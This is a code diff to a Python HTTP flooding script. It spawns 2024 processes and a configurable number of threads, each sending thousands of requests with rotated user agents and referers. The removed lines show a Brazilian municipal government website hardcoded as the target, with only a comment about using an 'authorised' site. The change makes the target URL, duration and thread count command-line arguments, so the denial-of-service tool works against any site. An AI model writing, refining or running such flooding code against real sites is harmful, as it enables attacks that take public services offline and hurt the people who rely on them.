@@ -3,6 +3,7 @@ import random
 import time
 import multiprocessing
 import threading
+import sys
 
 def read_user_agents():
     with open("useragents.txt", "r") as file:
@@ -47,27 +48,31 @@ def send_request(url, user_agents, referers, num_requests):
         print(f"Error accessing {url}: {str(e)}")
 
 def main():
-    url = "https://www.guaruja.sp.gov.br/"  # Substitua com o site autorizado
+    if len(sys.argv) != 4:
+        print("Usage: python app.py <url> <duration> <threads>")
+        sys.exit(1)
+
+    url = sys.argv[1]
+    duration = int(sys.argv[2])
+    num_threads = int(sys.argv[3])
+    
     user_agents = read_user_agents()
     referers = read_referers()
     num_processes = 2024
-    num_threads = 500
-    num_requests_per_thread = 1014  # Aumentado para 1014 solicitações por thread/processo
-    duration = 300  # segundos
-
+    
     start_time = time.time()
 
     # Usando multiprocessing para enviar requisições simultaneamente
     processes = []
     for _ in range(num_processes):
-        p = multiprocessing.Process(target=send_request, args=(url, user_agents, referers, num_requests_per_thread))
+        p = multiprocessing.Process(target=send_request, args=(url, user_agents, referers, 10391))  # Fixando o número de solicitações por processo
         p.start()
         processes.append(p)
 
     # Usando threading para enviar requisições simultaneamente
     threads = []
     for _ in range(num_threads):
-        t = threading.Thread(target=send_request, args=(url, user_agents, referers, num_requests_per_thread))
+        t = threading.Thread(target=send_request, args=(url, user_agents, referers, 10391))  # Fixando o número de solicitações por thread
         t.start()
         threads.append(t)
 
